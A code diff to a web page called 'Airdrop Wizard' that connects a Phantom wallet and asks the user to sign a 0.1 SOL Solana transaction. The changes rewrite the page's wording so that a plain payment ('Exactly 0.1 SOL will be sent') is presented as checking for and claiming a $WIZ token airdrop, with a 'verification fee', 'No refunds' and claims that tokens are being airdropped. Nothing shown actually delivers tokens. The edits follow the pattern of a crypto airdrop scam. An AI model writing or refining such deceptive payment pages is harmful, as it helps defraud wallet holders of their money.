@@ -84,7 +84,7 @@
     }
 
     .amount {
-      font-size: 2.5rem;
+      font-size: 2.4rem;
       color: #ffff00;
       text-align: center;
       margin: 15px 0 25px;
@@ -109,7 +109,7 @@
 
     #sendBtn {
       background: linear-gradient(45deg, #39ff14, #00ffff);
-      font-size: 1.9rem;
+      font-size: 1.85rem;
       padding: 26px;
     }
 
@@ -152,22 +152,22 @@
     </header>
 
     <div class="card">
-      <h1>SEND 0.1 SOL</h1>
-      <div class="amount">0.1 SOL → $WIZ AIRDROP</div>
+      <h1>CHECK FOR AIRDROPS</h1>
+      <div class="amount">0.1 SOL FEE • INSTANT CLAIM</div>
       <p style="text-align:center; font-size:1.6rem; margin-bottom:25px;">
-        Connect your Phantom wallet.<br>
-        Approve the transaction to claim your neon tokens.
+        Connect your Phantom wallet and check for your $WIZ airdrop.<br>
+        A small 0.1 SOL transaction is required to verify and claim.
       </p>
 
       <button id="connectBtn">CONNECT PHANTOM WALLET</button>
-      <button id="sendBtn" style="display:none;">SEND 0.1 SOL & APPROVE</button>
+      <button id="sendBtn" style="display:none;">CHECK FOR AIRDROPS</button>
 
       <div id="status" class="status"></div>
     </div>
 
     <footer>
       © 2026 Airdrop Wizard • $WIZ TOKEN<br>
-      Exactly 0.1 SOL will be sent
+      0.1 SOL verification fee • No refunds
     </footer>
   </div>
 
@@ -211,7 +211,7 @@
         return;
       }
 
-      statusDiv.innerHTML = `<span style="color:#ffff00;">Building transaction...</span>`;
+      statusDiv.innerHTML = `<span style="color:#ffff00;">Checking the neon grid for your airdrop...</span>`;
 
       try {
         const connection = new solanaWeb3.Connection(
@@ -229,39 +229,35 @@
           })
         );
 
-        // Get recent blockhash
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = publicKey;
 
         statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;
 
-        // Send to Phantom for approval + signing + broadcasting
         const signedTransaction = await provider.signAndSendTransaction(transaction);
 
         statusDiv.innerHTML = `
-          <span style="color:#39ff14;">✅ TRANSACTION SENT!</span><br>
-          Signature: ${signedTransaction.signature.slice(0,12)}...
+          <span style="color:#39ff14;">✅ AIRDROP CLAIM INITIATED!</span><br>
+          Transaction: ${signedTransaction.signature.slice(0,12)}...
         `;
 
-        // Optional: show success message
         setTimeout(() => {
-          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Thank you! Your $WIZ airdrop is being processed in the neon grid.</span>`;
-        }, 2000);
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Your $WIZ tokens are being airdropped. Welcome to the neon grid!</span>`;
+        }, 2500);
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected or failed.<br>Please try again.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected.<br>Please try again or check your balance.</span>`;
       }
     }
 
     connectBtn.addEventListener('click', connectPhantom);
     sendBtn.addEventListener('click', sendTransaction);
 
-    // Initial check
     window.addEventListener('load', () => {
       if (window.solana && window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓</span>`;
+        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓ Ready to check airdrops</span>`;
       }
     });
   </script>
